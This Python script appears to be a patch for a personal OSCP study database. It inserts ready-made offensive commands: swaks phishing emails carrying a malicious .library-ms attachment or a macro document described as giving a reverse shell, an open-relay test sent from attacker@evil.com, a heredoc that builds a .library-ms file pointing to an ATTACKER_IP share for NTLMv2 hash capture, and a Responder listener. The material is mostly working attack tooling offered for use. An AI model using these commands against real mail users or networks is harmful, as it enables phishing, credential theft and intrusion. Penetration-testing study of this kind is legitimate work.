#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - SWAKS PATCH           ##
##############################################
Adds swaks SMTP phishing commands
Usage:
    python3 swaks_patch.py
Skips duplicates by exact command match - safe to re-run.
"""
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    {
        "tool": "swaks",
        "description": "Send phishing email with malicious .library-ms attachment to capture NTLMv2 hash via Responder",
        "command": "swaks --to TARGET@DOMAIN --from SENDER@DOMAIN --server SMTP_IP --auth LOGIN --auth-user SENDER@DOMAIN --auth-password PASSWORD --header 'Subject: Important Config' --body 'Please review the attached configuration file.' --attach /home/kali/webdav/config.library-ms",
        "category": "phishing",
        "tags": "windows,phishing,swaks,smtp,library-ms,ntlmv2,responder,hash-capture"
    },
    {
        "tool": "swaks",
        "description": "Send phishing email with malicious ODT macro attachment for reverse shell",
        "command": "swaks --to TARGET@DOMAIN --from SENDER@DOMAIN --server SMTP_IP --auth LOGIN --auth-user SENDER@DOMAIN --auth-password PASSWORD --header 'Subject: Resume' --body 'Please find my resume attached.' --attach /home/kali/resume.odt",
        "category": "phishing",
        "tags": "windows,phishing,swaks,smtp,odt,macro,reverse-shell"
    },
    {
        "tool": "swaks",
        "description": "Test SMTP server for open relay -- no auth required",
        "command": "swaks --to TARGET@DOMAIN --from attacker@evil.com --server SMTP_IP",
        "category": "enumeration",
        "tags": "windows,smtp,enumeration,open-relay,swaks"
    },
    {
        "tool": "library-ms",
        "description": "Create malicious .library-ms file pointing to Responder UNC path for NTLMv2 capture",
        "command": "cat > config.library-ms << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n  <searchConnectorDescriptionList>\n    <searchConnectorDescription>\n      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n      <isSupported>false</isSupported>\n      <simpleLocation>\n        <url>\\\\ATTACKER_IP\\test</url>\n      </simpleLocation>\n    </searchConnectorDescription>\n  </searchConnectorDescriptionList>\n</libraryDescription>\nXMLEOF",
        "category": "phishing",
        "tags": "windows,phishing,library-ms,ntlmv2,responder,hash-capture,webdav"
    },
    {
        "tool": "responder",
        "description": "Start Responder to capture NTLMv2 hashes from .library-ms phishing -- run before sending email",
        "command": "sudo responder -I tun0 -wv",
        "category": "phishing",
        "tags": "windows,responder,ntlmv2,hash-capture,phishing,library-ms"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:55]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:55]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
